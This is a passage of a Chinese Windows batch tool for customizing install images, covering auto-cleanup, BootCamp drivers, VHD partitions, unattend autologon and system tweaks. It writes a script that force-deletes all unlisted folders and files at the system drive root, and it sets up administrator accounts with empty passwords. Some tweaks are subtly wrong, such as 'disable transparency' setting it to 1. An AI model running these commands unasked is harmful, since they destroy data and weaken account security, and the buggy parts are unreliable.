if /i "!Serving: =!" equ "" cls && echo. && echo.您的输入为空，请按任意键返回... && pause>nul && goto :input13
set "Item=关闭"!Serving!"服务"
echo net stop !Serving! >> "!ScriptsLog!\Serving.log"
if exist "!ScriptsLog!\Serving.log" ( call :Log & call :Achiexe ) else ( call :Failure )

:input14
cls&mode con cols=80 lines=30&title 整合自动清理
set "Item=整合自动清理"
set "goto=menu3"
echo.
echo.    _____________________________ 整合自动清理 _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   当使用Setup.exe安装系统时，C盘旧的文件会被保留，旧的系统会被打包成   ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows.old。添加自动清理后，当系统安装完成时，C盘所有旧的文件和文   ^|
echo.   ^|                                                                        ^|
echo.   ^|   件夹都会被自动清理，包括Windows.old。                                ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 整合自动清理                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 2 goto :menu3
if errorlevel 1 goto :Autoclean

:Autoclean
cls
echo PerfLogs>"Mount\Windows\Temp\keep.txt"
echo Program Files>>"Mount\Windows\Temp\keep.txt"
if /i "!Bit!"=="64" echo Program Files ^(x86^)>>"Mount\Windows\Temp\keep.txt"
echo ProgramData>>"Mount\Windows\Temp\keep.txt"
echo Users>>"Mount\Windows\Temp\keep.txt"
echo Windows>>"Mount\Windows\Temp\keep.txt"
echo EFI>>"Mount\Windows\Temp\keep.txt"
echo BootCamp>>"Mount\Windows\Temp\keep.txt"
echo bootcamp>>"Mount\Windows\Temp\keep.txt"
echo for /f "eol=: delims=" %%%%i in ^('dir %%SystemDrive%%\ /b /ad-s^^^|findstr /vxilg:"%%WinDir%%\Temp\keep.txt"'^) do ^(rd /s /q "%%SystemDrive%%\%%%%i"^) > "!ScriptsLog!\Autoclean.log"
echo del /F /Q /A-S "%%SystemDrive%%\*.*" >> "!ScriptsLog!\Autoclean.log"
if exist "!ScriptsLog!\Autoclean.log" ( call :Log & call :Achiexe ) else ( call :Failure )

:input15
cls&mode con cols=80 lines=30&title 针对苹果电脑优化
set "Item="
set "goto=input15"
echo.
echo.    ___________________________ 针对苹果电脑优化 ___________________________
echo.   ^|                           ------------------                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   这里的项目，只有在系统安装于苹果电脑时才会生效，安装于PC无效。       ^|
echo.   ^|                                                                        ^|
echo.   ^|   选项[1]:当系统安装于苹果电脑时，首次进桌面后会自动搜索并调用苹果专   ^|
echo.   ^|                                                                        ^|
echo.   ^|   用的BootCamp驱动。驱动总裁，驱动精灵，万能驱动等则会自动被清除。     ^|
echo.   ^|                                                                        ^|
echo.   ^|   选项[2]:首次进桌面后在桌面新建名称为ztm.txt的文本，在文本内写上需要  ^|
echo.   ^|                                                                        ^|
echo.   ^|   创建分区的数量与大小，然后保存文本即可创建对应分区，对苹果系统无影   ^|
echo.   ^|                                                                        ^|
echo.   ^|   响，如需查看详情请按 G ...                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 自动搜索并安装BootCamp驱动                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 苹果电脑傻瓜式创建多分区                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12GX /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 4 goto :menu3
if errorlevel 3 ( start www.cmdpe.com & goto :input15 )
if errorlevel 2 goto :AppleVhd
if errorlevel 1 goto :BootCmp

:BootCmp
REM Reg add "HKLM\ZTM\Classes\Installer\Products\6B6EFFCF8EABE094880D90A7D91A4CD3" /v "ProductName" /t REG_SZ /d "Boot Camp 服务" /f >nul 2>nul
cls&title 自动搜索并安装BootCamp驱动
set "Item=自动搜索并安装BootCamp驱动"
copy /v /y "File\BootCamp\BootCamp.exe" "!Scripts!\BootCamp.exe" >nul 2>nul
echo if exist %%windir%%\Driver rd /s /q %%windir%%\Driver > "!ScriptsLog!\StartBootCamp.log"
echo if exist "%%SystemDrive%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%SystemDrive%%\BootCamp\BootCamp" ^&^& goto :BootCamp >> "!ScriptsLog!\StartBootCamp.log"
echo if exist "%%Windir%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%Windir%%\BootCamp\BootCamp" ^&^& goto :BootCamp  >> "!ScriptsLog!\StartBootCamp.log"
echo for %%%%a in ^(C D E F G H I J K L M N O P Q R S T U V W X Y Z^) do if exist "%%%%a:\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%%%a:\BootCamp" ^&^& goto :BootCamp >> "!ScriptsLog!\StartBootCamp.log"
echo if not defined BootCamp goto :NoBootCamp >> "!ScriptsLog!\StartBootCamp.log"
echo :BootCamp  >> "!ScriptsLog!\StartBootCamp.log"
echo copy /v /y "%%~dp0BootCamp.exe" "%%BootCamp%%\Bootcamp.exe"  >> "!ScriptsLog!\StartBootCamp.log"
echo echo start "" "%%BootCamp%%\Bootcamp.exe"^^^&exit /b ^> "%%Windir%%\BootCamp.cmd" >> "!ScriptsLog!\StartBootCamp.log"
echo :NoBootCamp  >> "!ScriptsLog!\StartBootCamp.log"
if exist "!ScriptsLog!\StartBootCamp.log" ( call :Log & call :Achiexe ) else ( call :Failure )


REM echo if exist "%%SystemDrive%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%SystemDrive%%\BootCamp\BootCamp\Setup.exe" ^&^& "%%SystemDrive%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" /quiet /norestart ^&^& goto :BootCamp >> "%ScriptsLog%\StartBootCamp.log"
REM echo if exist "%%Windir%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%SystemDrive%%\BootCamp\BootCamp\Setup.exe" ^&^& "%%Windir%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" /quiet /norestart ^&^& goto :BootCamp  >> "%ScriptsLog%\StartBootCamp.log"
REM echo for %%%%a in ^(C D E F G H I J K L M N O P Q R S T U V W X Y Z^) do if exist "%%%%a:\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%%%a\BootCamp\BootCamp\Setup.exe" ^&^&" %%%%a:\BootCamp\Drivers\Apple\BootCamp.msi" /quiet /norestart ^&^& goto :BootCamp >> "%ScriptsLog%\StartBootCamp.log"
REM echo if not defined BootCamp goto :NoBootCamp >> "%ScriptsLog%\StartBootCamp.log"


REM echo if exist "%%SystemDrive%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%SystemDrive%%\BootCamp\BootCamp\Setup.exe" ^&^& goto :BootCamp >> "%ScriptsLog%\StartBootCamp.log"
REM echo if exist "%%Windir%%\BootCamp\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%SystemDrive%%\BootCamp\BootCamp\Setup.exe" ^&^& goto :BootCamp  >> "%ScriptsLog%\StartBootCamp.log"
REM echo for %%%%a in ^(C D E F G H I J K L M N O P Q R S T U V W X Y Z^) do if exist "%%%%a:\BootCamp\Drivers\Apple\BootCamp.msi" set "BootCamp=%%%%a\BootCamp\BootCamp\Setup.exe" ^&^& goto :BootCamp >> "%ScriptsLog%\StartBootCamp.log"
REM echo if not defined BootCamp goto :NoBootCamp >> "%ScriptsLog%\StartBootCamp.log"
REM echo :BootCamp >> "%ScriptsLog%\StartBootCamp.log"
REM echo echo Dim WshShell ^> "%%Windir%%\BootCamp.vbs" >> "%ScriptsLog%\StartBootCamp.log"
REM echo echo Set WshShell=WScript.CreateObject^("WScript.Shell"^) ^>^> "%%Windir%%\BootCamp.vbs" >> "%ScriptsLog%\StartBootCamp.log"
REM echo echo WshShell.Run "%%BootCamp%%" ^>^> "%%Windir%%\BootCamp.vbs" >> "%ScriptsLog%\StartBootCamp.log"
REM echo echo WScript.Sleep 200 ^>^> "%%Windir%%\BootCamp.vbs" >> "%ScriptsLog%\StartBootCamp.log"
REM echo echo WshShell.SendKeys "p" ^>^> "%%Windir%%\BootCamp.vbs" >> "%ScriptsLog%\StartBootCamp.log"
REM echo echo CreateObject^("Scripting.filesystemobject"^).DeleteFile ^(WScript.ScriptFullName^) ^>^> "%%Windir%%\BootCamp.vbs" >> "%ScriptsLog%\StartBootCamp.log"
REM echo :NoBootCamp  >> "%ScriptsLog%\StartBootCamp.log"
REM if exist "!ScriptsLog!\StartBootCamp.log" ( call :Log & call :Achiexe ) else ( call :Failure )

:AppleVhd
cls&title 苹果电脑傻瓜式创建多分区 
set "Item=整合苹果电脑傻瓜式创建多分区"
set "AppleVHD=Mount\Windows\Apple.cmd"
echo @echo off^&setlocal EnableDelayedExpansion > "!AppleVHD!"
echo :begin >> "!AppleVHD!"
echo Find /i "go" "%%USERPROFILE%%\Desktop\ZTM.txt"^>nul 2^>nul ^&^& goto :size ^|^| ^(ping -n 8 127.0.0.1^>nul^&^&goto :begin ^) >> "!AppleVHD!"
echo set /a index=0 >> "!AppleVHD!"
echo set /a diskindex=0 >> "!AppleVHD!"

echo :size >> "!AppleVHD!"
echo set /a index+=1 >> "!AppleVHD!"
echo set "size=" >> "!AppleVHD!"
echo for /f "usebackq tokens=%%index%% delims= " %%%%i in ^("%%USERPROFILE%%\Desktop\ZTM.txt"^) do ^(set /a size=%%%%i^) >> "!AppleVHD!"
echo if /i %%size%% gtr 0 ^( goto :disk ^) else ^( goto :end ^) >> "!AppleVHD!"

echo :disk >> "!AppleVHD!"
echo set /a diskindex+=1 >> "!AppleVHD!"
echo set "Disk=" >> "!AppleVHD!"
echo for /f "tokens=%%diskindex%% delims= " %%%%i in ^("D E F G H I J K L M N O P Q R S T U V W X Y Z"^) do ^(fsutil fsinfo drives^|find /i "%%%%i:\"^>nul ^|^| set "Disk=%%%%i"^) >> "!AppleVHD!"
echo if not defined Disk goto :disk >> "!AppleVHD!"

echo :next >> "!AppleVHD!"
echo if not exist %%windir%%\VHD md %%windir%%\VHD^>nul >> "!AppleVHD!"
echo set /a vhdsize=^(%%size%%-1^)*4+1024*%%size%% >> "!AppleVHD!"
echo cmd /c "echo create vdisk file=%%windir%%\VHD\%%Disk%%.vhdx maximum=%%vhdsize%% type=expandable & echo attach vdisk & echo create partition primary & echo format quick label=%%Disk%% & echo assign letter=%%Disk%% & echo exit"^|diskpart.exe >> "!AppleVHD!"
echo echo select vdisk file=%%windir%%\VHD\%%Disk%%.vhdx^>^>%%windir%%\VHD\muont_vhd.txt >> "!AppleVHD!"
echo echo attach vdisk^>^>%%windir%%\VHD\muont_vhd.txt >> "!AppleVHD!"
echo echo 此磁盘为虚拟磁盘，如需备份本磁盘，请备份%%windir%%\VHD\%%Disk%%.vhdx。读取本磁盘内容，请用Windows磁盘管理挂载（或者附加）%%windir%%\VHD\%%Disk%%.vhdx即可。^> %%Disk%%:\使用必读.txt >> "!AppleVHD!"
echo echo.^>^>%%Disk%%:\使用必读.txt >> "!AppleVHD!"
echo echo 若开机不能自动挂载，请运行桌面上的"修复自动挂载虚拟磁盘.cmd"即可。^>^>%%Disk%%:\使用必读.txt >> "!AppleVHD!"
echo echo @echo off^^^&schtasks /create /tn "自动挂载虚拟磁盘" /tr "diskpart.exe /s '%%windir%%\VHD\muont_vhd.txt'" /sc ONLOGON /ru SYSTEM /f^^^>nul^^^&cls^^^&echo.^^^&echo.修复自动挂载虚拟磁盘完成，请按任意键退出...^^^&pause^^^>nul^^^&exit^>%%USERPROFILE%%\Desktop\修复自动挂载虚拟磁盘.cmd >> "!AppleVHD!"
echo schtasks /create /tn "自动挂载虚拟磁盘" /tr "diskpart.exe /s '%%windir%%\VHD\muont_vhd.txt'" /sc ONLOGON /ru SYSTEM /f >> "!AppleVHD!"
echo goto :size >> "!AppleVHD!"
echo :end >> "!AppleVHD!"
echo del /f /q "%%USERPROFILE%%\Desktop\ZTM.txt" >> "!AppleVHD!"
echo rd /s /q %%windir%%\Sysprep >> "!AppleVHD!"
echo del /f /q %%0 >> "!AppleVHD!"
if exist "Mount\Windows\Apple.cmd" ( call :Log & call :Achiexe ) else ( call :Failure )

:input16
cls&mode con cols=80 lines=30&title 整合无人值守自动安装
set "Unattend=Mount\Windows\Panther\Unattend.xml"
set "Item="
set "goto=menu3"
echo.
echo.    _________________________ 整合无人值守自动安装 _________________________
echo.   ^|                         ----------------------                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 自动创建User用户名并加入管理员用户组（密码为空）                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 以内置管理员Administrator用户登录 （密码为空）                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] 自定义用户名并加入管理员用户组 （密码为空）                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:123X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 4 goto :menu3
if errorlevel 3 goto :InputUser
if errorlevel 2 goto :Administrator
if errorlevel 1 goto :User

:User
set "Item=整合无人值守自动安装-自动创建User用户名并加入管理员用户组（密码为空）"
md "Mount\Windows\Panther" >nul 2>nul
echo ^<?xml version="1.0" encoding="utf-8"?^> > "!Unattend!"
echo ^<unattend xmlns="urn:schemas-microsoft-com:unattend"^> >> "!Unattend!"
echo     ^<settings pass="oobeSystem"^> >> "!Unattend!"
echo         ^<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"^> >> "!Unattend!"
echo 			^<OOBE^> >> "!Unattend!"
echo 				^<SkipMachineOOBE^>true^</SkipMachineOOBE^> >> "!Unattend!"
echo 				^<SkipUserOOBE^>true^</SkipUserOOBE^> >> "!Unattend!"
echo 			^</OOBE^> >> "!Unattend!"			 
echo 			^<AutoLogon^> >> "!Unattend!"
echo                 ^<Username^>User^</Username^> >> "!Unattend!"
echo                 ^<Enabled^>true^</Enabled^> >> "!Unattend!"
echo                 ^<LogonCount^>1^</LogonCount^> >> "!Unattend!"
echo 				^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo            ^</AutoLogon^> >> "!Unattend!"			
echo 			^<UserAccounts^> >> "!Unattend!"
echo 				^<LocalAccounts^> >> "!Unattend!"
echo 					^<LocalAccount wcm:action="add"^> >> "!Unattend!"
echo                         ^<Name^>User^</Name^> >> "!Unattend!"
echo                         ^<Group^>administrators^</Group^> >> "!Unattend!"
echo                         ^<DisplayName^>User^</DisplayName^> >> "!Unattend!"
echo                         ^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo                     ^</LocalAccount^> >> "!Unattend!"
echo 				^</LocalAccounts^> >> "!Unattend!"
echo 			^</UserAccounts^> >> "!Unattend!"		
echo         ^</component^> >> "!Unattend!"
echo         ^<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="X86" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"^> >> "!Unattend!"           
echo 			^<OOBE^> >> "!Unattend!"
echo 				^<SkipMachineOOBE^>true^</SkipMachineOOBE^> >> "!Unattend!"
echo 				^<SkipUserOOBE^>true^</SkipUserOOBE^> >> "!Unattend!"
echo 			^</OOBE^> >> "!Unattend!"			 
echo 			^<AutoLogon^> >> "!Unattend!"
echo                 ^<Username^>User^</Username^> >> "!Unattend!"
echo                 ^<Enabled^>true^</Enabled^> >> "!Unattend!"
echo                 ^<LogonCount^>1^</LogonCount^> >> "!Unattend!"
echo 				^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo            ^</AutoLogon^>	>> "!Unattend!"		
echo 			^<UserAccounts^> >> "!Unattend!"
echo 				^<LocalAccounts^> >> "!Unattend!"
echo 					^<LocalAccount wcm:action="add"^> >> "!Unattend!"
echo                         ^<Name^>User^</Name^> >> "!Unattend!"
echo                         ^<Group^>administrators^</Group^> >> "!Unattend!"
echo                         ^<DisplayName^>User^</DisplayName^> >> "!Unattend!"
echo                         ^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo                     ^</LocalAccount^> >> "!Unattend!"
echo 				^</LocalAccounts^> >> "!Unattend!"
echo 			^</UserAccounts^> >> "!Unattend!"			
echo         ^</component^> >> "!Unattend!"
echo     ^</settings^> >> "!Unattend!"
echo ^</unattend^> >> "!Unattend!"
echo Net ACCOUNTS /MAXPWAGE:UNLIMITED > "!ScriptsLog!\password.log"
if exist "!Unattend!" ( call :Log & call :Achiexe ) else ( call :Failure )

:Administrator
cls
set "Item=整合无人值守自动安装-以内置管理员Administrator用户登录 （密码为空）"
md "Mount\Windows\Panther" >nul 2>nul
echo ^<?xml version="1.0" encoding="utf-8"?^> > "!Unattend!"
echo ^<unattend xmlns="urn:schemas-microsoft-com:unattend"^> >> "!Unattend!"
echo     ^<settings pass="oobeSystem"^> >> "!Unattend!"
echo         ^<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"^> >> "!Unattend!"
echo 			^<OOBE^> >> "!Unattend!"
echo 				^<SkipMachineOOBE^>true^</SkipMachineOOBE^> >> "!Unattend!"
echo 				^<SkipUserOOBE^>true^</SkipUserOOBE^> >> "!Unattend!"
echo 			^</OOBE^> >> "!Unattend!"			 
echo     		^<AutoLogon^> >> "!Unattend!"
echo                 ^<Username^>Administrator^</Username^> >> "!Unattend!"
echo                 ^<Enabled^>true^</Enabled^> >> "!Unattend!"
echo                 ^<LogonCount^>1^</LogonCount^> >> "!Unattend!"
echo            ^</AutoLogon^> >> "!Unattend!"
echo            ^<LogonCommands^> >> "!Unattend!"
echo                 ^<AsynchronousCommand wcm:action="add"^> >> "!Unattend!"
echo                     ^<Description^>Active^</Description^> >> "!Unattend!"
echo                     ^<Order^>1^</Order^> >> "!Unattend!"
echo                 ^</AsynchronousCommand^> >> "!Unattend!"
echo            ^</LogonCommands^> >> "!Unattend!"	
echo         ^</component^> >> "!Unattend!"
echo         ^<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="X86" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"^> >> "!Unattend!"           
echo 			^<OOBE^> >> "!Unattend!"
echo 				^<SkipMachineOOBE^>true^</SkipMachineOOBE^> >> "!Unattend!"
echo 				^<SkipUserOOBE^>true^</SkipUserOOBE^> >> "!Unattend!"
echo 			^</OOBE^> >> "!Unattend!"			 
echo     		^<AutoLogon^> >> "!Unattend!"
echo                 ^<Username^>Administrator^</Username^> >> "!Unattend!"
echo                 ^<Enabled^>true^</Enabled^> >> "!Unattend!"
echo                 ^<LogonCount^>1^</LogonCount^> >> "!Unattend!"
echo            ^</AutoLogon^> >> "!Unattend!"
echo            ^<LogonCommands^> >> "!Unattend!"
echo                 ^<AsynchronousCommand wcm:action="add"^> >> "!Unattend!"
echo                     ^<Description^>Active^</Description^> >> "!Unattend!"
echo                     ^<Order^>1^</Order^> >> "!Unattend!"
echo                 ^</AsynchronousCommand^> >> "!Unattend!"
echo            ^</LogonCommands^> >> "!Unattend!"			
echo         ^</component^> >> "!Unattend!"
echo     ^</settings^> >> "!Unattend!"
echo ^</unattend^> >> "!Unattend!"
echo Net ACCOUNTS /MAXPWAGE:UNLIMITED > "!ScriptsLog!\password.log"
if exist "!Unattend!" ( call :Log & call :Achiexe ) else ( call :Failure )

:InputUser
cls&echo.
echo.    ____________________________ 自定义用户名 ______________________________
echo.   ^|                            --------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   请在下行光标处输入自定义用户名然后回车，请勿输入标点符号与特殊符号。 ^|
echo.   ^|                                                                        ^|
echo.   ^|   如需返回输入 X 然后回车。                                            ^|
echo.   ^|                                                                        ^|
echo.
set "User="
set /p User=^>^>^>^>^>^>^>请输入：
if not defined User cls && echo. && echo.您的输入为空，请按任意键返回重新输入... && pause>nul && goto :InputUser
set "User=!User:"=!"
if not defined User cls && echo. && echo.您的输入格式不正确，请按任意键返回重新输入... && pause>nul && goto :InputUser
if /i "!User: =!" equ "" cls && echo. && echo.您的输入为空，请按任意键返回重新输入... && pause>nul && goto :InputUser
if /i "!User:.=!" equ "" cls && echo. && echo.您的输入格式不正确，请按任意键返回重新输入... && pause>nul && goto :InputUser
if /i "!User!" equ "x" goto :input16
set "Item=整合无人值守自动安装-自动创建"!User!"用户名并加入管理员用户组（密码为空）"
if /i "!User: =!" neq "!User!" cls && echo. && echo.您的输入"!User!"有空格，用户名不建议有空格，请按任意键返回重新输入... && pause>nul && goto :InputUser
md "Mount\Windows\Panther" >nul 2>nul
echo ^<?xml version="1.0" encoding="utf-8"?^> > "!Unattend!"
echo ^<unattend xmlns="urn:schemas-microsoft-com:unattend"^> >> "!Unattend!"
echo     ^<settings pass="oobeSystem"^> >> "!Unattend!"
echo         ^<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"^> >> "!Unattend!"
echo 			^<OOBE^> >> "!Unattend!"
echo 				^<SkipMachineOOBE^>true^</SkipMachineOOBE^> >> "!Unattend!"
echo 				^<SkipUserOOBE^>true^</SkipUserOOBE^> >> "!Unattend!"
echo 			^</OOBE^> >> "!Unattend!"			 
echo 			^<AutoLogon^> >> "!Unattend!"
echo                 ^<Username^>!User!^</Username^> >> "!Unattend!"
echo                 ^<Enabled^>true^</Enabled^> >> "!Unattend!"
echo                 ^<LogonCount^>1^</LogonCount^> >> "!Unattend!"
echo 				^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo            ^</AutoLogon^> >> "!Unattend!"			
echo 			^<UserAccounts^> >> "!Unattend!"
echo 				^<LocalAccounts^> >> "!Unattend!"
echo 					^<LocalAccount wcm:action="add"^> >> "!Unattend!"
echo                         ^<Name^>!User!^</Name^> >> "!Unattend!"
echo                         ^<Group^>administrators^</Group^> >> "!Unattend!"
echo                         ^<DisplayName^>!User!^</DisplayName^> >> "!Unattend!"
echo                         ^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo                     ^</LocalAccount^> >> "!Unattend!"
echo 				^</LocalAccounts^> >> "!Unattend!"
echo 			^</UserAccounts^> >> "!Unattend!"		
echo         ^</component^> >> "!Unattend!"
echo         ^<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="X86" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"^> >> "!Unattend!"           
echo 			^<OOBE^> >> "!Unattend!"
echo 				^<SkipMachineOOBE^>true^</SkipMachineOOBE^> >> "!Unattend!"
echo 				^<SkipUserOOBE^>true^</SkipUserOOBE^> >> "!Unattend!"
echo 			^</OOBE^> >> "!Unattend!"			 
echo 			^<AutoLogon^> >> "!Unattend!"
echo                 ^<Username^>!User!^</Username^> >> "!Unattend!"
echo                 ^<Enabled^>true^</Enabled^> >> "!Unattend!"
echo                 ^<LogonCount^>1^</LogonCount^> >> "!Unattend!"
echo 				^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo            ^</AutoLogon^>	>> "!Unattend!"		
echo 			^<UserAccounts^> >> "!Unattend!"
echo 				^<LocalAccounts^> >> "!Unattend!"
echo 					^<LocalAccount wcm:action="add"^> >> "!Unattend!"
echo                         ^<Name^>!User!^</Name^> >> "!Unattend!"
echo                         ^<Group^>administrators^</Group^> >> "!Unattend!"
echo                         ^<DisplayName^>!User!^</DisplayName^> >> "!Unattend!"
echo                         ^<Password^>^<Value^>^</Value^>^</Password^> >> "!Unattend!"
echo                     ^</LocalAccount^> >> "!Unattend!"
echo 				^</LocalAccounts^> >> "!Unattend!"
echo 			^</UserAccounts^> >> "!Unattend!"			
echo         ^</component^> >> "!Unattend!"
echo     ^</settings^> >> "!Unattend!"
echo ^</unattend^> >> "!Unattend!"
echo Net ACCOUNTS /MAXPWAGE:UNLIMITED > "!ScriptsLog!\password.log"
if exist "!Unattend!" ( call :Log & call :Achiexe ) else ( call :Failure )

:xitongyouhua
cls&mode con cols=80 lines=30&title Windows 系统优化
set "Item="
set "goto=xitongyouhua"
echo.
echo.    ___________________________ Windows 系统优化 ___________________________
echo.   ^|                           ------------------                           ^|
echo.   ^|   [1] Windows10 添加并开启卓越性能                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 清除所有的开机启动项                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] Windows 10 关闭提示和技巧                                        ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] 开启/关闭搜索索引 ^(关闭搜索索引会使您的计算机搜索文件变慢^)       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [5] 禁用透明效果                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [6] 清理磁盘碎片 ^(固态硬盘不需清理,建议您使用专业软件清理^^!^)        ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:123456X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 7 goto :menu1
if errorlevel 6 goto :CleanUpDiskDebris
if errorlevel 5 goto :DisableTransparency
if errorlevel 4 goto :SearchIndex
if errorlevel 3 goto :DisableTipsAndTechniques
if errorlevel 2 goto :DELBootItems
if errorlevel 1 goto :ExcellentPerformance

:ExcellentPerformance
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
title=添加并启用卓越性能电源计划
powercfg /list | find "(卓越性能)" > NUL
if %ERRORLEVEL% == 0 (
goto SetActive
) else (
goto DuplicateScheme
)

:DuplicateScheme
powercfg /DUPLICATESCHEME e9a42b02-d5df-448d-aa00-03f14749eb61 && echo 导入完成。 && goto SetActive

:SetActive
for /f "tokens=3,4" %%i in ('powercfg /list') do (
if "%%j" == "(卓越性能)" powercfg /SETACTIVE %%i && echo 激活成功。&&goto :Achiexe
)
:://-----------------------------------------------------------------------------------//::
:DELBootItems
del /f /q /s C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*
echo.启动文件夹内的所有要开机启动的文件已删除
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /va /f
echo 注册表启动项已删除完毕
goto :Achiexe

:DisableTipsAndTechniques
REG ADD HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f
taskkill /f /im explorer.exe
start explorer.exe
goto :Achiexe

:SearchIndex
for /F "tokens=1* delims= " %%a in ('net start') do (
if /I "%%a %%b" == "WSearch" set svrst=1
if !svrst! == 0 net start WSearch
if !svrst! == 1 net stop WSearch
)
goto :Achiexe

:DisableTransparency
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize /v EnableTransparency /t REG_DWORD /d 1 /f
goto :Achiexe

:CleanUpDiskDebris
for %%i in (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) do (if exist "%%i:" (title 磁盘碎片清理工具-正在清理: %%i:\&defrag %%i: /U /D))

msg /w /v /time:5 %Username% "您的计算机需要重新启动!您可以稍后重启,或者现在立刻重启。"
goto :Achiexe

:Convert
cls&mode con cols=80 lines=30&title 格式转换
set "Ext="
set "ExtTypes="
set "SourceExt="
set "TargetExt="
set "compress="
set "Total="
set "SourceName="
echo.
echo.    _______________________________ 格式转换 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   映像格式转换，支持多合一映像。                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] WIM 转 ESD                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ESD 转 WIM                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 3 goto :begin
if errorlevel 2 goto :ESDWIM
if errorlevel 1 goto :WIMESD

:WIMESD
title WIM转ESD
set "SourceExt=.wim"
set "TargetExt=.esd"
set "compress= --solid"
:: set "compress=--solid --solid-compress=lzms:100"
goto :ConvertNext

:ESDWIM
title ESD转WIM
set "SourceExt=.esd"
set "TargetExt=.wim"
:: set "compress=--compress=LZX"
set "compress=--compress=lzx:100"

:ConvertNext
cls&echo.
